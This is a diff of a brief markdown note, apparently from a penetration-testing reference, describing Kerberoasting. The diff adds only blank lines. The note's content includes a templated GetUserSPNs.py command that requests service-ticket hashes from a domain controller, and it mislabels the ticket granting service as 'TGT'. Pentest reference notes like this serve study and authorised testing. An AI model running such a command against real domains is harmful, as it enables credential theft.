@@ -32,13 +32,27 @@ Sevrice principal names (SPN) are unique identifiers used by Kerberos authentica
 
 Sevrice principal names (SPN) are unique identifiers used by Kerberos authentication. Due to how Kerberos handles service tickets, attackers may be able to query a domain controller with valid credentials, make a request to the ticket granting service (TGT), and receive the hash of other accounts.
 
+
+
+
+
 # Instructions
+
+
+
+
 
 **Command** ([[GetUserSPN.py Query Domain for SPNs and Dump Available Hashes]]):
 
 ```bash
 GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
 ```
+
+
+
+
+
+
 
 ## Platforms
 
@@ -63,3 +77,5 @@ GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
 - [[known vulnerability]]
 - [[Network]]
 - [[Service Attacks]]
+
+
